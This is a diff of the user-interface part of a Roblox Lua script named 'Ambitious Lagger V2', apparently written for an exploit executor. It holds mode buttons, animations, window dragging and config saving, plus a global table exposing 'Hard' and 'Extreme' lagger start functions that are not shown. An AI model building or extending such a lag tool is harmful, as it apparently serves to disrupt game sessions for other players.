+    }):Play()
+    TweenService:Create(ExtremeBtn, TWEEN, {
+        TextColor3 = (mode == "Extreme") and COL.White or COL.SubText
+    }):Play()
+
+    if State.Enabled then
+        stopAllModes()
+        startModeFor(mode)
+    end
+
+    if not skipSave then saveConfig() end
+end
+
+LowBtn.MouseButton1Click:Connect(function() setMode("Low End") end)
+HardBtn.MouseButton1Click:Connect(function() setMode("Hard") end)
+ExtremeBtn.MouseButton1Click:Connect(function() setMode("Extreme") end)
+
+setMode(State.Mode, true)
+setEnabled(State.Enabled, true)
+applyBG(State.BGMode, true)
+
+local minimized = false
+local closing   = false
+
+local ROWS = { Row1, Row2, Row3, Row4 }
+
+local ORIG = {}
+local function snapshot(obj)
+    if obj:IsA("UIStroke") then
+        ORIG[obj] = { Transparency = obj.Transparency }
+    elseif obj:IsA("TextLabel") or obj:IsA("TextButton") then
+        ORIG[obj] = {
+            TextTransparency = obj.TextTransparency,
+            BackgroundTransparency = obj.BackgroundTransparency,
+        }
+    elseif obj:IsA("Frame") or obj:IsA("ImageLabel") then
+        ORIG[obj] = { BackgroundTransparency = obj.BackgroundTransparency }
+    end
+end
+
+for _, row in ipairs(ROWS) do
+    snapshot(row)
+    for _, d in ipairs(row:GetDescendants()) do snapshot(d) end
+end
+
+local function setMinimized(on)
+    if closing then return end
+    minimized = on
+
+    local info = TweenInfo.new(0.32, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+
+    TweenService:Create(Main, info, {
+        Size = UDim2.fromOffset(WIDTH, on and COLLAPSED_H or FULL_H)
+    }):Play()
+
+    for i, row in ipairs(ROWS) do
+        local delay = on and (i - 1) * 0.03 or (#ROWS - i) * 0.03
+        local rowInfo = TweenInfo.new(0.26, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, delay)
+
+        local targets = { row }
+        for _, d in ipairs(row:GetDescendants()) do targets[#targets + 1] = d end
+
+        for _, obj in ipairs(targets) do
+            local o = ORIG[obj]
+            if o then
+                local goal = {}
+                for prop, value in pairs(o) do
+                    goal[prop] = on and 1 or value
+                end
+                TweenService:Create(obj, rowInfo, goal):Play()
+            end
+        end
+    end
+
+    MinBtn.Text = on and "+" or "-"
+
+    Config.Minimized = on
+    saveConfig()
+end
+
+MinBtn.MouseButton1Click:Connect(function()
+    setMinimized(not minimized)
+end)
+
+if Config.Minimized then
+    task.defer(function() setMinimized(true) end)
+end
+
+CloseBtn.MouseButton1Click:Connect(function()
+    if closing then return end
+    closing = true
+
+    stopAllModes()
+
+    local info = TweenInfo.new(0.28, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
+    local w, h = WIDTH, FULL_H
+
+    TweenService:Create(Main, info, {
+        Size = UDim2.fromOffset(w * 0.88, h * 0.88),
+        Position = Main.Position + UDim2.fromOffset(w * 0.06, h * 0.06),
+        BackgroundTransparency = 1,
+    }):Play()
+    TweenService:Create(BGImage, info, { ImageTransparency = 1 }):Play()
+    TweenService:Create(Overlay, info, { BackgroundTransparency = 1 }):Play()
+
+    for _, d in ipairs(Main:GetDescendants()) do
+        if d:IsA("TextLabel") or d:IsA("TextButton") then
+            TweenService:Create(d, info, { TextTransparency = 1, BackgroundTransparency = 1 }):Play()
+        elseif d:IsA("Frame") then
+            TweenService:Create(d, info, { BackgroundTransparency = 1 }):Play()
+        elseif d:IsA("UIStroke") then
+            TweenService:Create(d, info, { Transparency = 1 }):Play()
+        end
+    end
+
+    task.delay(0.32, function()
+        ScreenGui:Destroy()
+    end)
+end)
+
+do
+    local dragging  = false
+    local dragStart = Vector2.new()
+    local startPos  = UDim2.new()
+    local targetPos = Main.Position
+    local SMOOTH    = 0.18
+
+    TitleBar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+            dragging  = true
+            dragStart = input.Position
+            startPos  = Main.Position
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            targetPos = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + delta.X,
+                startPos.Y.Scale, startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+            if dragging then
+                dragging = false
+                Config.PosX = math.floor(Main.AbsolutePosition.X)
+                Config.PosY = math.floor(Main.AbsolutePosition.Y)
+                saveConfig()
+            end
+        end
+    end)
+    RunService.RenderStepped:Connect(function()
+        if closing then return end
+        Main.Position = Main.Position:Lerp(targetPos, SMOOTH)
+    end)
+end
+
+do
+    local PALETTE = {
+        COL.PurpleDeep,
+        COL.Purple,
+        COL.Violet,
+        COL.VioletLite,
+        COL.Violet,
+        COL.Purple,
+    }
+
+    local PALETTE_SUB = {
+        COL.Violet,
+        COL.VioletLite,
+        Color3.fromRGB(228, 205, 255),
+        COL.VioletLite,
+    }
+
+    local function sampleFrom(palette, p)
+        local n = #palette
+        p = p % 1
+        local scaled = p * n
+        local i = math.floor(scaled)
+        local f = scaled - i
+        f = f * f * (3 - 2 * f)
+        local a = palette[(i % n) + 1]
+        local b = palette[((i + 1) % n) + 1]
+        return a:Lerp(b, f)
+    end
+
+    local KEYS  = 12
+    local SPAN  = 0.75
+    local SPEED = 0.22
+    local phase = 0
+
+    local function buildSeq(palette, p, span)
+        local kps = table.create(KEYS + 1)
+        for i = 0, KEYS do
+            local a = i / KEYS
+            kps[i + 1] = ColorSequenceKeypoint.new(a, sampleFrom(palette, p + a * span))
+        end
+        return ColorSequence.new(kps)
+    end
+
+    local conn
+    conn = RunService.RenderStepped:Connect(function(dt)
+        if not Title.Parent then conn:Disconnect() return end
+        phase = (phase + dt * SPEED) % 1
+
+        TitleGrad.Color = buildSeq(PALETTE, phase, SPAN)
+        SubGrad.Color   = buildSeq(PALETTE_SUB, phase + 0.18, SPAN * 0.7)
+    end)
+end
+
+LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(1)
+    if State.Enabled then
+        stopAllModes()
+        task.wait(0.2)
+        startModeFor(State.Mode)
+    end
+end)
+
+if typeof(getgenv) == "function" then
+    getgenv().AmbitiousLaggerV2 = {
+        State      = State,
+        Config     = Config,
+        SaveConfig = saveConfig,
+        SetEnabled = setEnabled,
+        SetMode    = setMode,
+        SetBGMode  = applyBG,
+        Gui        = ScreenGui,
+        Platform   = {
+            IsMobile = IS_MOBILE,
+            UIScale  = UI_SCALE,
+            Scaler   = uiScale,
+        },
+        Hard = {
+            Start  = startHardLagger,
+            Stop   = stopHardLagger,
+            Config = hardCfg,
+            Instance = hardInstance,
+        },
+        Extreme = {
+            Start  = startExtremeLagger,
+            Stop   = stopExtremeLagger,
+            A = extremeA,
+            B = extremeB,
+        },
+        Low = {
+            Start  = startLowEnd,
+            Stop   = stopLowEnd,
+            Config = lowCfg,
+        },
+        BG = {
+            Modes = BG_MODES,
+            Cycle = cycleBG,
+        },
+    }
+end
+
+if canSave then
+    print("[Ambitious Lagger V2] GUI caricata - config: " .. CONFIG_FILE
+        .. (IS_MOBILE and " | platform: MOBILE" or " | platform: PC"))
+else
+    print("[Ambitious Lagger V2] GUI caricata - config non disponibile (executor senza writefile).")
+end
